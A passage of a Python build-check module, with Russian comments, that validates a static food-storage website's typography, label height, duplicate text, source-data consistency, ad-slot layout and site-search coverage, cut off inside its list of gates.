    for m in re.finditer(r"([a-z-]+)\s*:\s*([^;{}]+)[;}]", css):
        prop, value = m.group(1).strip(), m.group(2).strip()
        if prop not in _SPACE_PROPS:
            continue
        for tok in design._split_values(value):
            seen += 1
            if tok in _SPACE_OK or tok in derived:
                continue
            if re.match(r"^calc\(var\(--u\)\*\d+\)$", tok):
                continue
            bad.append("%s: «%s» не выведен из --u" % (prop, tok))
    return (bad or _seen(seen, "отступов в облике"))[:8]


# Ступени шкалы. Ниже 15px живёт РОВНО ОДНА — капитель подписей, и она не
# основной текст.
_SIZE_TOKENS = ("--f1", "--f2", "--f3", "--f4", "--d1", "--d2")
_BODY_MIN = 15.0


def g_type_scale(files):
    """Каждый кегль взят из шкалы, и шкала — это шкала.

    Было девять размеров в полосе 9,5–15px, пять из них с половиной пикселя
    (9,5 · 10,5 · 12,5 · 13,5 — они непредсказуемо округляются при DPR 1), а
    заголовок раздела (11px) был МЕНЬШЕ основного текста (13,5px). Шаг в
    полпикселя — не ступень иерархии.

    Три требования, и ни одно не выводится из другого:
      · ни одного `font-size` мимо токена шкалы;
      · основной текст (--f2, он же на body) не мельче 15px;
      · соседние ступени отличаются не меньше чем на 15%, иначе это шум.
    """
    import design
    css = design.strip_comments(design.CSS) + design.strip_comments(
        design.AD_CSS)
    root = design._root_vars(design.CSS)
    bad, seen = [], 0
    allowed = {"var(%s)" % t for t in _SIZE_TOKENS}
    for m in re.finditer(r"font-size\s*:\s*([^;}]+)", css):
        seen += 1
        v = m.group(1).strip()
        if v not in allowed:
            bad.append("кегль «%s» не из шкалы" % v)
    body = design.px_of("var(--f2)", design.CSS, design.BUDGET_VW)
    if body < _BODY_MIN:
        bad.append("основной текст %.1fpx мельче %.1fpx" % (body, _BODY_MIN))
    if design.decls(design.CSS, "body").get("font-size") != "var(--f2)":
        bad.append("body набран не основным кеглем шкалы")
    text = [design.px_of("var(%s)" % t, design.CSS, design.BUDGET_VW)
            for t in ("--f1", "--f2", "--f3", "--f4")]
    for a, b in zip(text, text[1:]):
        if b < a * 1.15:
            bad.append("ступени %.1f и %.1f ближе 15%%" % (a, b))
    small = [t for t in _SIZE_TOKENS
             if design.px_of("var(%s)" % t, design.CSS, design.BUDGET_VW)
             < _BODY_MIN]
    if small != ["--f1"]:
        bad.append("ниже %.0fpx живёт не только капитель: %s"
                   % (_BODY_MIN, ", ".join(small) or "ничего"))
    for t in _SIZE_TOKENS:
        if t not in root:
            bad.append("ступень %s не объявлена" % t)
    return (bad or _seen(seen, "кеглей в облике"))[:8]


def _css_solo_rules(css):
    """Класс -> его собственные объявления, только для селекторов из ОДНОГО
    класса. Составные («.hunt input») сюда не идут нарочно: вопрос гейта ниже
    про наследование внутри блока, а не про каскад вообще."""
    out = {}
    for m in re.finditer(r"([^{}]+)\{([^{}]*)\}", css):
        sel, body = m.group(1), m.group(2)
        for one in sel.split(","):
            mm = re.match(r"^\.([a-z][a-z0-9-]*)$", one.strip())
            if mm:
                out.setdefault(mm.group(1), "")
                out[mm.group(1)] += body + ";"
    return out


# Ниже этого трекинг считается шумом, а не приёмом: погашать его не обязано
# ничто, потому что и наследовать нечего.
_TRACK_MIN_EM = 0.01


def g_tracking_is_not_inherited(files):
    """Потомок со СВОИМ кеглем внутри блока с em-трекингом объявляет трекинг.

    Куплено переверсткой 16.09.2026, и дефект стоял на ПЕРВОЙ строке всех 295
    карточек товара. `letter-spacing` наследуется ВЫЧИСЛЕННОЙ АБСОЛЮТНОЙ
    длиной, а не долей кегля: `-.04em`, посчитанные на `.item` при её
    собственных 60px, приходят в дочерний `.ask` с кеглем 15px как -2.4px,
    то есть -0.16em. Пробелы схлопываются, и посетитель читает
    «Howlongdoes lastinthefridge» вместо вопроса, ради ответа на который он
    пришёл из поиска.

    Ни один прежний гейт этого не видел и не мог: разметка верна, классы
    объявлены и применены, кегли из шкалы, контраст в норме, высота в
    бюджете. Дефект живёт РОВНО в паре «родитель с трекингом — потомок со
    своим кеглем», и спрашивать про него надо этой парой.

    Область гейта — разметка, а не стиль: родство берётся из отданных
    страниц, потому что в CSS его не видно.
    """
    import design
    css = design.strip_comments(design.CSS) + design.strip_comments(
        design.AD_CSS)
    rules = _css_solo_rules(css)
    track_em, own_size, own_track = {}, set(), set()
    for cls, body in rules.items():
        t = re.search(r"letter-spacing:\s*(-?[0-9.]+)em", body)
        if t:
            track_em[cls] = float(t.group(1))
        if "letter-spacing:" in body:
            own_track.add(cls)
        if "font-size:" in body:
            own_size.add(cls)
    pairs, bad, seen = {}, [], 0
    for p, t in sorted(_html(files).items()):
        for _tag, cls, anc, _stack in _stack_walk(t):
            for c in cls:
                if c not in own_size:
                    continue
                for a in anc:
                    if abs(track_em.get(a, 0.0)) < _TRACK_MIN_EM:
                        continue
                    seen += 1
                    if c not in own_track:
                        pairs.setdefault((a, c), [track_em[a], 0, p])
                        pairs[(a, c)][1] += 1
    for (a, c), (em, cnt, where) in sorted(pairs.items()):
        bad.append("«%s» внутри «%s» (трекинг %sem) объявляет свой кегль и не "
                   "объявляет трекинга: %d узлов, напр. %s"
                   % (c, a, em, cnt, where))
    return (bad or _seen(seen, "пар «трекинг родителя — кегль потомка»"))[:8]


def g_label_fits_one_screen(files):
    """Бирка помещается на ОДИН экран телефона. Считается высота, не знаки.

    Главное правило облика: всё выше перфорации — ответ, и он помещается на
    экран без прокрутки. Сторожил его `len(name) > 48`, то есть ЧИСЛО ЗНАКОВ:
    «Beef broth, stock, consomme (commercially produced)» — ровно 48 знаков —
    уходил в четыре строки по 46px и делал вторую по высоте бирку сайта, а
    короткие имена ужимались зря. Замер в браузере на прежней сборке: 230
    страниц из 299 выше бюджета, худшая 902px при бюджете 553.

    Линейка (design.label_height) считает по ОТДАННОЙ разметке и ОТДАННОМУ
    CSS, а не по намерениям генератора, и проверена в браузере на всём
    корпусе: она не занижает.
    """
    import design
    bad, seen = [], 0
    for p, t in sorted(_products(files).items()):
        lab = design.label_of(t)
        if not lab:
            bad.append("%s: бирки нет вовсе" % p)
            continue
        seen += 1
        h = design.label_height(lab, design.CSS, design.AD_CSS)
        if h > design.BUDGET_PX:
            bad.append("%s: бирка %.0fpx при бюджете %dpx"
                       % (p, h, design.BUDGET_PX))
    return (bad or _seen(seen, "бирок в сборке"))[:8]


# ------------------------------------------------ главный элемент страницы

MAIN_RE = re.compile(r"<main\b[^>]*>(.*)</main>", re.S)


def _main_text(t):
    """ПОЛНЫЙ видимый текст главного элемента. None, если его нет.

    Снимается только script и style. Ни объявленные общими разделы, ни банк
    фраз, ни подвал отсюда НЕ вычитаются: это другой вопрос, чем «своя ли у
    страницы проза», и задавать его надо по тому, что человек видит.
    """
    m = MAIN_RE.search(t)
    if not m:
        return None
    return _visible(m.group(1))


TAG_RE = re.compile(r"<(/?)([a-z][a-z0-9]*)\b([^>]*)>")
VOID = ("meta", "link", "br", "img", "input", "hr", "source", "col", "area")


def _stack_walk(t):
    """Разметка -> поток (тег, классы, классы предков, стек предков).

    Написано здесь и вручную: гейт, спрашивающий вложенность у того, кто её
    построил, согласен сам с собой. Регулярное выражение видит СОСЕДСТВО, а
    ломается в этих дефектах именно РОДИТЕЛЬ.
    """
    stack, out = [], []
    for m in TAG_RE.finditer(t):
        close, tag, attrs = m.group(1), m.group(2), m.group(3)
        if tag in VOID:
            continue
        if close:
            for i in range(len(stack) - 1, -1, -1):
                if stack[i][0] == tag:
                    del stack[i:]
                    break
            continue
        cm = re.search(r'class="([^"]*)"', attrs)
        cls = cm.group(1).split() if cm else []
        out.append((tag, cls, [c for _tg, cs in stack for c in cs],
                    list(stack)))
        if not attrs.rstrip().endswith("/"):
            stack.append((tag, cls))
    return out


def g_twins_full_page(files):
    """Близнецы по ПОЛНОМУ видимому тексту главного элемента.

    Мерка близнецов до сих пор снимала с текста объявленное общим — три
    раздела, банк фраз и подвал. Это правильный вопрос («пишем ли мы всем
    одно и то же»), но не единственный: человек и робот видят страницу
    ЦЕЛИКОМ, вместе с общим хвостом. На соседнем сайте правило близнецов,
    суженное до одного типа страниц, пропустило 52 страницы другого типа при
    0,948 — поэтому здесь полный текст и ВСЕ типы страниц.

    Потолок с числами выше, чем у своего текста, и выше он ПО ЗАМЕРУ, а не
    на глаз: 06.09.2026 худшая пара давала 0,6491 по своему тексту и 0,7474
    по всему главному элементу — вклад объявленного общего хвоста 0,098.
    MAIN_TWIN_MAX = 0,70 своего текста + этот вклад. Связывающей остаётся
    мерка по своему тексту; эта ловит другое — пару, разошедшуюся прозой и
    совпавшую всем остальным.
    """
    import render as rd
    bad, seen, kinds = [], 0, {}
    for p, t in sorted(_html(files).items()):
        txt = _main_text(t)
        if txt is None:
            bad.append("%s: нет главного элемента <main>" % p)
            continue
        kinds.setdefault(_page_type(t) or "?", []).append((p, txt))
    for kind, rows in sorted(kinds.items()):
        if len(rows) < 2:
            continue
        keys = [p for p, _x in rows]
        for what, fn, thr in (("с числами", rd.shingles_num, rd.MAIN_TWIN_MAX),
                              ("по скелету", rd.shingles, rd.MAIN_SKEL_MAX)):
            sh = [fn(x) for _p, x in rows]
            if not any(sh):
                bad.append("%s, мерка «%s»: ни одного слова" % (kind, what))
                continue
            seen += sum(1 for x in sh if x)
            for i in range(len(sh)):
                for j in range(i + 1, len(sh)):
                    jc = rd.jaccard(sh[i], sh[j])
                    if jc >= thr:
                        bad.append("%s, %s: %s ~ %s: %.3f при пороге %.2f"
                                   % (kind, what, keys[i], keys[j], jc, thr))
                        if len(bad) > 10:
                            return bad
    return (bad or _seen(seen, "полных текстов главного элемента"))[:8]


_HEAD_UNITS = r"(?:hour|day|week|month|year)s?"


def _owned_numbers(t):
    """Числа, которые печатает ФУНКЦИЯ-ВЛАДЕЛЕЦ величины: поле бирки, строка
    бланка, строка списка. Проза сюда не входит нарочно."""
    out = set()
    for m in re.finditer(r'<div class="dur(?: long)?">([^<]*)</div>', t):
        out.update(re.findall(r"[0-9]+(?:\.[0-9]+)?", unescape(m.group(1))))
    # Ячейка ответа — ТОЖЕ функция-владелец, и с переездом главной величины
    # в неё список владельцев обязан был вырасти. Без этой строки срок из
    # заголовка не находился бы на странице ни у одного продукта, у которого
    # он больше нигде не повторяется.
    for m in re.finditer(r'<div class="out"[^>]*data-plain="([^"]*)"', t):
        out.update(re.findall(r"[0-9]+(?:\.[0-9]+)?", unescape(m.group(1))))
    for pat in (r'<span class="rv"[^>]*>(.*?)</span>',
                r'<span class="v">(.*?)</span>'):
        for m in re.finditer(pat, t, re.S):
            txt = unescape(re.sub(r"<[^>]+>", " ", m.group(1)))
            out.update(re.findall(r"[0-9]+(?:\.[0-9]+)?", txt))
    return out


def g_head_numbers_are_owned(files):
    """Срок, названный в ЗАГОЛОВКЕ или ОПИСАНИИ, стоит на странице величиной.

    Заголовок и описание — единственный текст сайта, который человек читает
    ДО перехода, и единственный, мимо которого проходят все проверки текста:
    в видимом тексте их нет, а разметку о числах никто не спрашивал.

    Проверяется число С ЕДИНИЦЕЙ ВРЕМЕНИ («4 days», «6 months»): это и есть
    величина, у которой на странице есть владелец. Владелец — поле бирки,
    строка бланка или строка списка, но НЕ проза: число, попавшее в
    заголовок из абзаца мимо величины, и есть тот дефект, ради которого
    правило «одна величина — одна функция» писалось.
    """
    bad, seen = [], 0
    for p, t in sorted(_html(files).items()):
        h = re.search(r"<title>(.*?)</title>", t, re.S)
        d = re.search(r'<meta name="description" content="([^"]*)"', t)
        if not (h and d):
            continue
        own = _owned_numbers(t)
        for where, text in (("заголовок", unescape(h.group(1))),
                            ("описание", unescape(d.group(1)))):
            for m in re.finditer(r"(?<![0-9.])([0-9]+(?:\.[0-9]+)?)\s+"
                                 + _HEAD_UNITS, text):
                seen += 1
                if m.group(1) not in own:
                    bad.append("%s, %s: «%s» нет ни в одном поле страницы"
                               % (p, where, m.group(0)))
    return (bad or _seen(seen, "сроков в заголовках и описаниях"))[:8]


# Где подписи и величинам жить ПОЗВОЛЕНО, и список этот ОБЪЯВЛЕН: поле бирки,
# сигнальное поле и коробка поиска (она носит ту же капитель). Новый дом,
# заведшийся молча, — это приём облика, растащенный по странице.
_CAP_HOMES = ("hot", "field", "find")


def g_row_parts_in_a_row(files):
    """Ни одной части сигнатурного приёма ВНЕ его самого.

    Приём облика здесь — строка бланка: имя слева, величина справа, точки
    между ними. `<li>` вне списка ловит свой гейт; эта проверка про ОСТАЛЬНЫЕ
    куски того же приёма, каждый из которых ломает его молча:

      · `<span class="rk">` или `<span class="rv">` вне строки — браузер
        рисует их подряд, и имя слипается с величиной, как слиплось
        «1.2 V +0.0%same volts» в 520 ячейках соседнего сайта;
      · строка бланка, у которой есть имя и нет величины, или наоборот;
      · `<div class="cap">`, `<div class="dur">` или `<div class="out">`
        вне поля ответа.
    """
    bad, seen = [], 0
    for p, t in sorted(_html(files).items()):
        for _tag, cls, anc, stack in _stack_walk(t):
            tags = [tg for tg, _c in stack]
            if "rk" in cls or "rv" in cls:
                seen += 1
                if "li" not in tags:
                    bad.append("%s: часть строки бланка (%s) вне <li>"
                               % (p, " ".join(cls)))
                elif "rows" not in anc:
                    bad.append("%s: часть строки бланка (%s) вне списка строк"
                               % (p, " ".join(cls)))
            if "cap" in cls or "dur" in cls or "out" in cls:
                seen += 1
                if not (set(anc) & set(_CAP_HOMES)):
                    bad.append("%s: часть поля бирки (%s) вне поля"
                               % (p, " ".join(cls)))
        for m in re.finditer(r'<ul class="rows"[^>]*>(.*?)</ul>', t, re.S):
            for li in re.findall(r"<li\b[^>]*>(.*?)</li>", m.group(1), re.S):
                seen += 1
                has_k = '<span class="rk">' in li
                has_v = '<span class="rv"' in li
                if has_k != has_v:
                    bad.append("%s: строка бланка с одной половиной: «%s»"
                               % (p, re.sub(r"<[^>]+>", "", li)[:40]))
    return (bad or _seen(seen, "частей сигнатурного приёма"))[:8]


# Семьи ячеек источника. Объявлены ЗДЕСЬ, а не взяты у разбора: гейт, который
# спрашивает состав семьи у того, кого проверяет, согласен сам с собой.
_SOURCE_FAMILIES = {
    "pantry": ("pantry", "pantry_purchase", "pantry_open"),
    "fridge": ("fridge", "fridge_purchase", "fridge_open", "fridge_thaw"),
    "freeze": ("freeze", "freeze_purchase"),
}


def _raw_is_a_figure(txt):
    """Есть ли в СЫРОЙ ячейке число. Правило своё, простое и независимое:
    непусто, не «not recommended», не объявленный нечисловой ответ и
    начинается с цифры. Разбор источника сюда не зовётся нарочно."""
    if not txt:
        return False
    t = txt.strip().lower()
    if not t or "not recommended" in t:
        return False
    if t in fk.SAYS:
        return False
    return bool(re.match(r"^[0-9]", t))


def g_silence_matches_the_source(files):
    """«Источник об этом молчит» проверяется ПО ИСТОЧНИКУ, а не по разбору.

    Страница говорит про еду «no pantry figure exists for it» — утверждение о
    ПОЛНОТЕ, и печатать его из того же разбора, который мог ячейку потерять,
    нельзя. Мы уже записывали «источника данных нет» там, где он лежал у
    самого производителя, и уже теряли 444 348 домов на выбрасывании записи
    без имени.

    Гейт открывает СЫРОЙ файл источника, находит строки продукта по row_ids
    и сверяет обе стороны:

      · сказано «молчит» — ни одна сырая ячейка семьи не несёт числа;
      · напечатана величина семьи — сырая ячейка с числом есть;
      · в сырой ячейке число есть — страница его печатает. Это и есть
        «ячейка, потерянная разбором»: у соответствия ВСЕГДА две стороны.
    """
    import render as rd
    raw = json.load(io.open(fk.RAW, encoding="utf-8"))
    by_id = {str(x["id"]): x for x in raw["product_data"]}
    field = {k: f for k, f, _l in fk.SLOTS}
    corp = {x["slug"]: x for x in rd.load_corpus()[0]}
    claims = (("pantry", "no pantry figure exists for it"),
              ("freeze", "no freezer figure at all"))
    bad, seen = [], 0
    for p, t in sorted(_products(files).items()):
        it = corp.get(p[:-len("/index.html")])
        if it is None:
            bad.append("%s: страница есть, а продукта в корпусе нет" % p)
            continue
        ids = [str(x) for x in (it.get("row_ids") or [it["id"]])]
        if not ids:
            bad.append("%s: страница не помнит своих строк источника" % p)
            continue
        states = it.get("states") or [{"slots": it.get("slots") or {}}]
        vis = _visible(t)
        for fam, keys in sorted(_SOURCE_FAMILIES.items()):
            seen += 1
            raw_has = any(
                _raw_is_a_figure((by_id.get(i) or {}).get(field[k], ""))
                for i in ids for k in keys)
            printed = any(
                (st.get("slots") or {}).get(k)
                and (st["slots"][k][0] != "no")
                for st in states for k in keys)
            if printed and not raw_has:
                bad.append("%s: напечатана величина «%s», а числа в сырых "
                           "ячейках нет" % (p, fam))
            if raw_has and not printed:
                bad.append("%s: в сырой ячейке «%s» число есть, а страница "
                           "его не печатает" % (p, fam))
        for fam, phrase in claims:
            if phrase not in vis:
                continue
            seen += 1
            hit = [(i, k) for i in ids for k in _SOURCE_FAMILIES[fam]
                   if _raw_is_a_figure((by_id.get(i) or {}).get(field[k], ""))]
            if hit:
                i, k = hit[0]
                bad.append("%s: сказано «%s», а строка %s несёт %s = %r"
                           % (p, phrase, i, k,
                              (by_id.get(i) or {}).get(field[k])))
    return (bad or _seen(seen, "сверок с сырым источником"))[:8]


# Единственные, кому позволено ОБРЕЗАТЬ рекламное место, и ширина обоих
# посчитана в _container. Список объявлен: обрезающий предок, появившийся
# молча, — это недобор инвентаря, которого не видно ни в браузере, ни в
# переполнении документа.
_AD_CLIPPERS = ("sheet", "ad")
_BAD_AD_DECL = (r"position:\s*(?:absolute|fixed|sticky)",
                r"float:\s*(?:left|right)",
                r"margin[a-z-]*:\s*-[0-9]")


def _grid_cells(decl):
    """«grid-column:1;grid-row:1/span 2» -> множество занятых клеток."""
    def span(name):
        m = re.search(r"grid-%s:\s*([0-9]+)(?:\s*/\s*(?:span\s*([0-9]+)"
                      r"|([0-9]+)))?" % name, decl)
        if not m:
            return None
        start = int(m.group(1))
        if m.group(2):
            return list(range(start, start + int(m.group(2))))
        if m.group(3):
            return list(range(start, int(m.group(3))))
        return [start]
    col, row = span("column"), span("row")
    if col is None or row is None:
        return None
    return {(c, r) for c in col for r in row}


def _direct_children(files):
    """Класс родителя -> множество классов его ПРЯМЫХ детей, по разметке."""
    out = {}
    for t in _html(files).values():
        for _tag, cls, _anc, stack in _stack_walk(t):
            if not stack:
                continue
            for pc in stack[-1][1]:
                out.setdefault(pc, set()).update(cls)
    return out


def g_ad_slots_do_not_overlap(files):
    """Место не налезает на соседа и не обрезается незаметно.

    Точный размер и вместимость колонки проверяет свой гейт. Здесь три
    других способа потерять инвентарь, которых замером ширины не видно:

      · место внутри места — вложенный блок делит одну площадь на двоих;
      · выход из потока (`position:absolute|fixed|sticky`, `float`,
        отрицательный отступ) у самого места или у любого предка: в потоке
        коробки не налезают, вне потока — только так и бывает;
      · две клетки сетки, назначенные одному месту: `.label` и `.sheet > .ad`
        стоят в одной колонке разными строками, и разъезжаются они молча.

    Плюс список тех, кому вообще позволено обрезать место: `overflow:hidden`
    у элемента, не названного в _AD_CLIPPERS, — это 728x90, отрисованные как
    439x90, то есть деньги, которых не будет.
    """
    import design
    import render as rd
    css = design.strip_comments(design.CSS) + \
        design.strip_comments(design.AD_CSS)
    blocks = _css_blocks(css)
    bad, seen = [], 0
    ancestors = set()
    for p, t in sorted(_html(files).items()):
        for _tag, cls, anc, _stack in _stack_walk(t):
            if "ad" not in cls:
                continue
            seen += 1
            if "ad" in anc:
                bad.append("%s: место внутри места (%s)" % (p, " ".join(cls)))
            ancestors.update(anc)
    watched = set(ancestors) | {"ad"} | set(rd.AD_SLOTS)
    for mq, sel, body in blocks:
        for one in sel.split(","):
            one = one.strip()
            names = set(re.findall(r"[.]([a-z][a-z0-9-]*)", one))
            if not (names & watched):
                continue
            for pat in _BAD_AD_DECL:
                mm = re.search(pat, body)
                if mm:
                    bad.append("правило «%s» (с %dpx) выводит место из "
                               "потока: %s" % (one[:40], mq, mm.group(0)))
            # Обрезает ЦЕЛЫЙ элемент, то есть селектор из одного класса:
            # `.ad-rail .hsub` режет текст внутри самого объявления, и это
            # наша вёрстка, а не потеря инвентаря.
            solo = re.match(r"^\.([a-z][a-z0-9-]*)$", one)
            if solo and re.search(r"overflow:\s*(?:hidden|clip)", body) \
                    and solo.group(1) not in _AD_CLIPPERS:
                bad.append("правило «%s» обрезает место и не объявлено "
                           "обрезающим" % one[:40])
    kids = _direct_children(files)
    for g in [sel for _mq, sel, body in blocks if "display:grid" in body]:
        gname = set(re.findall(r"[.]([a-z][a-z0-9-]*)", g))
        mine = set()
        for c in gname:
            mine |= kids.get(c, set())
        placed = {}
        for mq, sel, body in blocks:
            cells = _grid_cells(body)
            if cells is None:
                continue
            for one in sel.split(","):
                one = one.strip()
                tail = one.split(">")[-1].strip()
                names = set(re.findall(r"[.]([a-z][a-z0-9-]*)", tail))
                if not (names & mine):
                    continue
                if ">" in one:
                    head = set(re.findall(r"[.]([a-z][a-z0-9-]*)",
                                          one.split(">")[0]))
                    if not (head & gname):
                        continue
                placed.setdefault(mq, {})[one] = cells
        for mq, byname in sorted(placed.items()):
            names = sorted(byname)
            for i in range(len(names)):
                for j in range(i + 1, len(names)):
                    seen += 1
                    both = byname[names[i]] & byname[names[j]]
                    if both:
                        bad.append("в сетке «%s» на %dpx «%s» и «%s» делят "
                                   "клетки %s" % (g.strip(), mq, names[i],
                                                  names[j], sorted(both)))
        # СЕТКА С РЕКЛАМНЫМ МЕСТОМ ОБЯЗАНА ОБЪЯВЛЯТЬ КЛЕТКИ НЕ ОДНОМУ ТОЛЬКО
        # МЕСТУ. Сосед, расставленный автоматически (у него объявлен один
        # `grid-column` и нет `grid-row`), в разбор клеток НЕ ПОПАДАЕТ — и
        # проверка «две клетки одному месту» становится проверкой одного
        # элемента против пустоты. Пар нет, `bad` пуст, гейт зелен.
        #
        # Ровно так он и онемел при смене облика 16.09.2026: место переехало
        # во вторую колонку с явными строками, а .label/.perf/.stub остались
        # с одним `grid-column`. Поломка при этом срабатывала — литерал она
        # находила, — но краснеть было нечему. Это второй вид немоты после
        # «поломка промахнулась»: ВЫБОРКА СЪЁЖИЛАСЬ ДО ОДНОГО, а одного для
        # сравнения не хватает.
        if mine & ({"ad"} | set(rd.AD_SLOTS)):
            if not placed:
                bad.append("в сетке «%s» есть рекламное место и ни одной "
                           "объявленной клетки" % g.strip())
            for mq, byname in sorted(placed.items()):
                seen += 1
                if len(byname) < 2:
                    bad.append("в сетке «%s» на %dpx клетки объявлены только "
                               "у «%s»: сравнивать место не с чем"
                               % (g.strip(), mq, sorted(byname)[0]))
    return (bad or _seen(seen, "мест, предков и клеток сетки"))[:8]


# ------------------------------------------------------------ поиск сайта
# Сопоставитель переписан ЗДЕСЬ, по правилам FINDER_JS, и переписан нарочно:
# гейт, зовущий ту же функцию, что и страница, согласен сам с собой, а поиск
# страницы живёт в скрипте, которого питон не исполняет вовсе.


def _f_toks(s):
    return [x for x in re.split(r"[^a-z0-9]+", s.lower()) if x]


def _f_key(s):
    return re.sub(r"[^a-z0-9]+", "", s.lower())


def _f_ed1(a, b):
    """Ровно одна правка, первый знак общий, длины отличаются не более чем на
    единицу. Переписано по FINDER_JS шаг в шаг."""
    la, lb = len(a), len(b)
    if la - lb > 1 or lb - la > 1 or a[:1] != b[:1]:
        return 0
    x = y = e = 0
    while x < la and y < lb:
        if a[x] == b[y]:
            x += 1
            y += 1
            continue
        e += 1
        if e > 1:
            return 0
        if la > lb:
            x += 1
        elif lb > la:
            y += 1
        else:
            x += 1
            y += 1
    if x < la or y < lb:
        e += 1
    return 0 if e > 1 else 1


def _f_score(a, b):
    if a == b:
        return 5
    if b.find(a) == 0:
        return 4
    if a.find(b) == 0 and len(a) - len(b) < 4:
        return 3
    if len(a) > 3 and len(b) > 3 and _f_ed1(a, b):
        return 2
    if len(a) > 3 and b.find(a) > 0:
        return 1
    return 0


def _f_entries(rows):
    ent = []
    for p in rows:
        ent.append((p, 0, _f_toks(p[0]), _f_key(p[0])))
        for a in p[3]:
            ent.append((p, 1, _f_toks(a), _f_key(a)))
    return ent


def _f_find(q, ent, stop, limit=8):
    qa, qk = _f_toks(q), _f_key(q)
    qt = [x for x in qa if x not in stop] or qa
    if not qk:
        return []
    best = {}
    for p, kind, tk, ky in ent:
        m = tot = hd = 0
        for t2 in qt:
            bs = 0
            for n, w in enumerate(tk):
                v = _f_score(t2, w)
                if v > bs:
                    bs = v
                # ГОЛОВА ИМЕНИ. Совпало первое слово записи, и совпало точно
                # или началом: «Chicken» на запрос «raw chicken». Хвостовое
                # слово так не считается — «Stuffed, raw chicken breasts»
                # стояло выше простой курицы именно потому, что длинное имя
                # набирает больше совпавших слов.
                if not n and v > 3:
                    hd = 1
            if bs:
                m += 1
                tot += bs
        # Запись, совпавшая НЕ ВСЕМИ словами запроса и не головой, ответом не
        # считается: «creme fraiche» отвечал «Marshmallow crème» по одному
        # хвостовому слову — уверенный ответ про еду, которой на сайте нет.
        if not m or (m < len(qt) and not hd):
            continue
        if ky.find(qk) == 0:
            # Псевдоним, который длиннее запроса на четыре знака и больше,
            # начальным совпадением не считается: «raw chicken breasts»
            # начинается с «raw chicken» и ставил фаршированную грудку выше
            # простой курицы.
            pre = (70 if len(ky) - len(qk) < 4 else 10) if kind else 100
        elif ky.find(qk) > 0:
            pre = 10
        else:
            pre = 0
        s2 = (pre + m * 12 + tot + (0 if kind else 20)
              + hd * (10 if kind else 40))
        h = p[1]
        if h not in best or best[h][0] < s2:
            best[h] = (s2, p)
    hits = sorted(best.values(), key=lambda x: (-x[0], len(x[1][0]), x[1][0]))
    return [p[1] for _s, p in hits[:limit]]


def g_search_finds_every_page(files):
    """Поиск НАХОДИТ каждую страницу, которую сайт выпустил.

    Гейт указателя проверял одну сторону: каждая строка ведёт на
    существующее. Обратная — есть ли строка у каждой страницы и приводит ли
    она к ней — не проверялась ничем, а главный клик сайта ломается именно
    там: двадцать три гейта были зелёными, пока поиск не находил ни «crv», ни
    «f150».

    Четыре требования, и все — НА САМОМ СОПОСТАВИТЕЛЕ:

      · множество целей указателя равно множеству страниц товаров ПО ИМЕНАМ,
        а не по счёту: две строки в одно место и одна страница без строки
        дают тот же счёт;
      · страница находится по своему собственному имени;
      · псевдоним, принадлежащий ровно одному продукту, приводит к нему;
      · каждый термин спроса что-нибудь находит.
    """
    import render as rd
    pages = _html(files)
    home = pages.get("index.html", "")
    m = re.search(r'<script type="application/json" id="ku-index">(.*?)'
                  r"</script>", home, re.S)
    if not m:
        return ["на главной нет указателя поиска"]
    try:
        rows = json.loads(m.group(1))
    except ValueError:
        return ["указатель поиска не разбирается"]
    sm = re.search(r'data-stop="([^"]*)"', home)
    stop = set(_f_toks(sm.group(1))) if sm else set()
    ent = _f_entries(rows)
    prods = {p for p, t in pages.items() if _page_type(t) == "product"}
    targets = {r[1].strip("/") + "/index.html" for r in rows}
    bad, seen = [], 0
    for p in sorted(prods - targets)[:4]:
        bad.append("страница выпущена, а строки поиска у неё нет: %s" % p)
    for p in sorted(targets - prods)[:4]:
        bad.append("строка поиска ведёт туда, где страницы нет: %s" % p)
    counts = {}
    for r in rows:
        for a in r[3]:
            counts[a.lower()] = counts.get(a.lower(), 0) + 1
    for r in rows:
        name, href = r[0], r[1]
        seen += 1
        if href not in _f_find(name, ent, stop):
            bad.append("поиск не находит %s по её собственному имени «%s»"
                       % (href, name))
        for a in r[3]:
            if counts.get(a.lower()) != 1:
                continue
            seen += 1
            if href not in _f_find(a, ent, stop):
                bad.append("поиск не находит %s по её единственному "
                           "псевдониму «%s»" % (href, a))
        if len(bad) > 10:
            break
    for term in rd.HEAD_TERMS:
        seen += 1
        if not _f_find(term, ent, stop):
            bad.append("запрос спроса «%s» не находит ничего" % term)
    return (bad or _seen(seen, "запросов к поиску"))[:8]


GATES = [
    ("язык страницы английский", g_language),
    ("нет управляющих байтов", g_control_chars),
    ("нет двойного экранирования", g_no_double_escape),
    ("браузер не ходит наружу", g_no_external),
    ("каждая объявленная несущая сканируется", g_carriers_are_scanned),
    ("каждый отданный файл разобран по своему виду",
     g_served_kinds_are_scanned),
    ("свой ресурс существует", g_own_resources_exist),
    ("скрипт один, встроенный, короткий", g_scripts),
    ("скрипт не строит разметку", g_script_builds_no_markup),
    ("голова страницы заполнена верно", g_head),
    ("внутренние ссылки ведут на существующее", g_internal_links),
    ("нет страниц-сирот", g_orphans),
    ("карта сайта совпадает с сайтом", g_sitemap),
    ("robots указывает карту", g_robots),
    ("политика совпадает с разметкой", g_privacy_matches_markup),
    ("политика безопасности закрывает несущие", g_csp_backs_the_carriers),
    ("ответ первым в каждом разделе", g_answer_first),
    ("нет близнецов по прозе", g_twins),
    ("одна величина — одно имя", g_one_value_one_relation),
    ("страница не спорит сама с собой", g_no_self_contradiction),
    ("объявленные классы применяются", g_css_classes_used),
    ("применённые классы объявлены", g_css_classes_declared),
    ("числа в README совпадают со сборкой", g_readme_numbers),
    ("слова совпадают с разметкой", g_words_match_markup),
    ("id не повторяется на странице", g_ids_unique),
    ("написание американское", g_us_spelling),
    ("нет ссылок на самих себя", g_no_self_links),
    ("поиск ведёт на существующее", g_search_index_resolves),
    ("мёртвых контролов нет", g_no_dead_controls),
    ("страница ведёт вверх и вбок", g_page_leads_up_and_sideways),
    ("страница несёт слова запроса", g_page_carries_the_query),
    ("число согласовано со словом рядом", g_number_agrees_with_verb),
    ("сигналом помечено то, что кончится первым",
     g_hot_is_the_binding_window),
    ("у каждого отсчёта своё поле", g_date_clocks),
    ("каждое состояние названо", g_every_state_named),
    ("соседи — другие продукты", g_neighbours_are_products),
    ("голова ниши выпущена", g_head_terms),
    ("две стороны расчёта различны", g_calc_sides_differ),
    ("числа в прозе совпадают с сайтом", g_numbers_agree),
    ("рекламные места стоят по объявлению", g_ad_inventory),
    ("рекламные места точного размера", g_ad_slots_exact),
    ("ответ выше первой рекламы", g_answer_above_the_ad),
    ("контраст пар в обеих темах", g_contrast),
    ("схема совпадает со страницей", g_schema_matches_page),
